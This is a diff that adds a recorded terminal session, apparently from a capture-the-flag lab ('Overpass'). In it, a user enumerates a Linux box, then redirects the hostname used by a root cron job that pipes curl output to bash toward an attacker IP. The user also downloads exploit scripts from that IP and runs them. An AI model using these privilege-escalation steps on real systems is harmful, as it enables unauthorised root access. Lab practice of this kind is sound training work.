@@ -1,0 +1,183 @@
+Script started on 2025-04-04 19:40:04+03:00 [COMMAND="ssh -i james.key james@overpass.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Enter passphrase for key 'james.key': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+47 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ ls
+todo.txt  user.txt
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ cat todo.txt
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ ls -l /etc/hosts
+-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+127.0.0.1 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ sed -i 's/^127\.0\.0\.1 overpass\.thm$/10.8.61.245 overpass.thm/' /etc/hosts
+sed: couldn't open temporary file /etc/sedJfS8mz: Permission denied
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ sudo sed -i 's/^127\.0\.0\.1 overpass\.thm$/10.8.61.245 overpass.thm/' /etc/hosts [A
+[sudo] password for james: 
+Sorry, try again.
+[sudo] password for james: 
+sudo: 1 incorrect password attempt
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ nano /etc/hosts
+[?1049h[22;0;0t[1;27r(B[m[4l[?7h[39;49m[?1h=[?1h=[?1h=[?25l[39;49m(B[m[H[2J[25;35H(B[0;7m[ Directory '/etc' is not writable ](B[m[H(B[0;7m  GNU nano 2.9.3                                  /etc/hosts                                            [1;103H(B[m[26d(B[0;7m^G(B[m Get Help   (B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut Text   (B[0;7m^J(B[m Justify    (B[0;7m^C(B[m Cur Pos    (B[0;7mM-U(B[m Undo[27d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Uncut Text (B[0;7m^T(B[m To Spell   (B[0;7m^_(B[m Go To Line (B[0;7mM-E(B[m Redo[25d[3d[39;49m(B[m127.0.0.1 localhost[4d127.0.1.1 overpass-prod[5d127.0.0.1 overpass.thm[6d[36m# The following lines are desirable for IPv6 capable hosts[7d[39m(B[m::1     ip6-localhost ip6-loopback[8dfe00::0 ip6-localnet[9dff00::0 ip6-mcastprefix[10dff02::1 ip6-allnodes[11dff02::2 ip6-allrouters[3d[?12l[?25h[?25l[4d[?12l[?25h[?25l[5d[?12l[?25h[?25l[6d[?12l[?25h[?25l[25d[J[27;104H[?12l[?25h[27;1H[?1049l[23;0;0t[?1l>]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ sudo [K[K[K[K[Ksed -i 's/^127\.0\.0\.1 overpass\.thm$/10.8.61.245 overpass.thm/' /etc/hosts
+sed: couldn't open temporary file /etc/sednBxK2m: Permission denied
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ find / -perm -4000 -type f 2>/dev/null
+/bin/fusermount
+/bin/umount
+/bin/su
+/bin/mount
+/bin/ping
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
+james:x:1001:1001:,,,:/home/james:/bin/bash
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ cat /etc/passwd[K[K[K[K[K[Kshadow
+cat: /etc/shadow: Permission denied
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ unam [Ke -r
+4.15.0-108-generic
+]0;james@overpass-prod: ~[01;32mjames@overpass-prod[00m:[01;34m~[00m$ cd /tmp
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ wget http://10.8.61.245/exploit.sh
+--2025-04-04 16:48:57--  http://10.8.61.245/exploit.sh
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2943 (2.9K) [text/x-sh]
+Saving to: ‘exploit.sh’
+
+exploit.sh                  0%[                                      ]       0  --.-KB/s               exploit.sh                100%[=====================================>]   2.87K  --.-KB/s    in 0.004s  
+
+2025-04-04 16:48:57 (797 KB/s) - ‘exploit.sh’ saved [2943/2943]
+
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ ls
+exploit.sh
+[0m[01;34msystemd-private-bb1e46767ddd4b17845acb949ea78af8-systemd-resolved.service-pO6xrR[0m
+[01;34msystemd-private-bb1e46767ddd4b17845acb949ea78af8-systemd-timesyncd.service-D0HabR[0m
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ chmod +x exploit.sh
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ ./exploit.sh
+[-] newuidmap is not installed
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ ./exploit.shchmod +x exploit.shls[Kwget http://10.8.61.245/exploit.sh[K[Kc
+--2025-04-04 16:50:31--  http://10.8.61.245/exploit.c
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5776 (5.6K) [text/x-csrc]
+Saving to: ‘exploit.c’
+
+exploit.c                   0%[                                      ]       0  --.-KB/s               exploit.c                 100%[=====================================>]   5.64K  --.-KB/s    in 0.009s  
+
+2025-04-04 16:50:31 (637 KB/s) - ‘exploit.c’ saved [5776/5776]
+
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ gcc exploit.c -o exploit
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ chmod +x exploit
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ ./exploit
+error: Permission denied
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ ls -l
+total 36
+-rwxrwxr-x 1 james james 13632 Apr  4 16:50 [0m[01;32mexploit[0m
+-rw-rw-r-- 1 james james  5776 Apr  4 16:50 exploit.c
+-rwxrwxr-x 1 james james  2943 Apr  4 16:48 [01;32mexploit.sh[0m
+drwx------ 3 root  root   4096 Apr  4 16:39 [01;34msystemd-private-bb1e46767ddd4b17845acb949ea78af8-systemd-resolved.service-pO6xrR[0m
+drwx------ 3 root  root   4096 Apr  4 16:39 [01;34msystemd-private-bb1e46767ddd4b17845acb949ea78af8-systemd-timesyncd.service-D0HabR[0m
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ echo "10.8.61.245 overpass.thm" >> /etc/hosts
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+127.0.0.1 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+10.8.61.245 overpass.thm
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ which nc
+/bin/nc
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ echo "10.8.61.245 overpass.thm" >> /etc/hosts[C[1P /etc/hosts
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ echo "10.8.61.245 overpass.thm" > /etc/hosts[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwhich nc[Kcat /etc/hosts
+10.8.61.245 overpass.thm
+]0;james@overpass-prod: /tmp[01;32mjames@overpass-prod[00m:[01;34m/tmp[00m$ exit
+logout
+Connection to overpass.thm closed.
+
+Script done on 2025-04-04 20:12:41+03:00 [COMMAND_EXIT_CODE="0"]
